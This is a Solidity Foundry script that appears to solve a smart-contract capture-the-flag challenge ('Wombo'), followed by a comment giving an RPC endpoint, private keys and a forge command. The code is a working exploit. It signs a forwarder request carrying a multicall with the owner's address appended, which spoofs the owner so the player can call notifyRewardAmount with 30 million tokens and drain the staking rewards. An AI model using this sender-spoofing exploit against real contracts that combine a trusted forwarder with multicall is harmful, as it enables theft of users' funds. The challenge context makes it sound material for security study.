// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

// import "src/Dutch/src/Challenge.sol";
import {ERC20} from "openzeppelin/token/ERC20/ERC20.sol";
import "forge-std/Script.sol";

import {Script, console} from "forge-std/Script.sol";
import "../test/Wombo.t.sol";
import {MessageHashUtils} from "lib/openzeppelin-contracts/contracts/utils/cryptography/MessageHashUtils.sol";

contract Wombo is Script {
    uint256 privateKey = 0x1ed17290aaf2a5d4c42ce208543f6828b347a79995909c92b69e356a1c18105c;
    address target = 0xE1d5883a9C2bd348f057cA2CdcC2E7E8b0270817;
    VmSafe.Wallet wallet;
    address player;

    Challenge challenge;
    Staking staking;
    Forwarder forwarder;

    Token token;
    Token reward;
    address owner;

    function setUp() public {
        wallet = vm.createWallet(privateKey);
        player = wallet.addr;
        console.log("publicAddress", player);
        console.log("eth balance: %e ", (player.balance));

        console.log("amazingNumber: %e", amazingNumber);

        challenge = Challenge(target);
        staking = Staking(challenge.staking());
        forwarder = Forwarder(challenge.forwarder());
        token = staking.stakingToken();
        reward = staking.rewardsToken();
        console.log("staking address: %s", address(staking));
        console.log("forwarder address: %s", address(forwarder));
        console.log("is Challenge complete", challenge.isSolved());
        owner = staking.owner();

        console.log("owner: %s", owner);
        console.log("owner balance: %e", owner.balance);
        console.log("owner codehash");
        console.logBytes32(owner.codehash);

        console.log("rewardRate: %e", staking.rewardRate());
        console.log("duration: %e", staking.duration());
        console.log("finishAt: %e", staking.finishAt());
        console.log("updatedAt: %e", staking.updatedAt());
        console.log("rewardPerTokenStored: %e", staking.rewardPerTokenStored());
        console.log("totalSupply: %e", staking.totalSupply());
        console.log("earnedTotal: %e", staking.earnedTotal());
    }

    uint256 amazingNumber = 1128120030438127299645800;
    bytes32 private constant _FORWARDREQUEST_TYPEHASH = keccak256(
        "ForwardRequest(address from,address to,uint256 value,uint256 gas,uint256 nonce,uint256 deadline,bytes data)"
    );

    function run() external {
        vm.startBroadcast(privateKey);
        console.log("123 balance: %e", reward.balanceOf(address(0x123)));
        //transfer all reward token to address 0x123
        if (reward.balanceOf(address(player)) > 0) {
            reward.transfer(address(0x123), reward.balanceOf(address(player)));
        }
        if (token.balanceOf(player) > 0) {
            token.approve(address(staking), type(uint256).max);
            staking.stake(token.balanceOf(player));

            _testSignature();
        }

        staking.getReward();

        console.log("challenge isSolved: %s", challenge.isSolved());
        vm.stopBroadcast();
    }

    function _testSignature() internal {
        uint256 rewardAmount = 30_000_000e18;
        bytes memory fakeCall = abi.encodeWithSignature("notifyRewardAmount(uint256)", rewardAmount);
        bytes memory encodeData = abi.encodePacked(fakeCall, owner); //0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496
        //0x3c6b16ab000000000000000000000000000000000000000000108b2a2c280290940000007fa9385be102ac3eac297483dd6233d62b3e1496
        bytes[] memory arrayCall = new bytes[](1);
        arrayCall[0] = encodeData;
        Forwarder.ForwardRequest memory req = Forwarder.ForwardRequest({
            from: player,
            to: address(staking),
            value: 0,
            gas: 400000,
            nonce: forwarder.getNonce(player),
            deadline: block.timestamp + 1000,
            data: abi.encodeWithSignature("multicall(bytes[])", arrayCall)
        }); //multicall 0xac9650d8

        bytes32 structHash = keccak256(
            abi.encode(
                _FORWARDREQUEST_TYPEHASH,
                req.from,
                req.to,
                req.value,
                req.gas,
                req.nonce,
                req.deadline,
                keccak256(req.data)
            )
        );
        bytes32 digest = MessageHashUtils.toTypedDataHash(forwarder.DOMAIN_SEPARATOR(), structHash);

        (uint8 v, bytes32 r, bytes32 s) = vm.sign(wallet.privateKey, digest);
        bytes memory signature = abi.encodePacked(r, s, v);
        (bool success,) = forwarder.execute(req, signature);

        require(success, "not success");
    }
}

// ---
// rpc endpoints:
//     - http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main
//     - ws://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main/ws
// private key:        0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec
// challenge contract: 0x976019eF0cD87c8cb54B95b04Ed64e40E842b8C0

// forge script  "Deploy" -w "src/script" \
//  -f "http://35.204.130.73:8545/VjrFHIDzOUspLEqYQhehMpaS/main" \
//  --private-key  "0x0b49634a1806a51e69decf63f876d3eb48755439779a13c6685b644daace34ec"
